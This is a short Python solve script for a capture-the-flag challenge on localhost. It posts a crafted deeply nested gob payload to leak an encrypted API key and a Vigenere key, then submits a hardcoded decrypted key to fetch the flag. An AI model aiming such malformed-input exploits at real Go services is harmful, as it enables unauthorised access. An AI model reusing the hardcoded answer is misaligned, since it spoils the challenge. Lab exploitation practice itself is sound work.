import requests
import base64

def getApiKeyandVigenereKey():
    #Create payload of nesting length > 16 by referencing https://goplay.tools/snippet/8IXAiVn0sQj
    data = {
        'userInput': 'JX8DAQEETm9kZQH/gAABAgEFVmFsdWUBBAABBE5leHQB/4AAAABD/4ACAQIBAQQBAQYBAQgBAQoBAQwBAQ4BARABARIBARQBARYBARgBARoBARwBAR4BASAAAAAAAAAAAAAAAAAAAAAAAA==',
    }

    response = requests.post('http://localhost:8000/c3VibWl0', data=data)
    return response.content.decode('utf-8').split('<script>')[0].split(' && ')

def getFlag():
    data = {
        'userInput': 'G0b_5m4ck3d_y37?',
    }

    response = requests.post('http://localhost:8000/ZmxhZ0F1dGg=', data=data)
    
    return response.content.decode('utf-8').split(' ')[1]

def main():
    keyList = getApiKeyandVigenereKey()
    vigenereEncryptedApiKey = keyList[0]
    decodedVigenereKey = base64.b64decode(keyList[1]).decode('ascii').split(' -> ')[1]
    vigenereEncryptedApiKey = ''.join(vigenereEncryptedApiKey.split(' '))
    print(f"Use online tool to decipher api key from '{vigenereEncryptedApiKey}' using key '{decodedVigenereKey}'")

    decryptedString = 'apikey -> G0b_5m4ck3d_y37?'
    print(f"Decrypted string {decryptedString}")
    flag = getFlag()
    # Write flag to file
    with open("./flag", "w") as w:
        w.write(flag)
        
if __name__ == "__main__":
    main()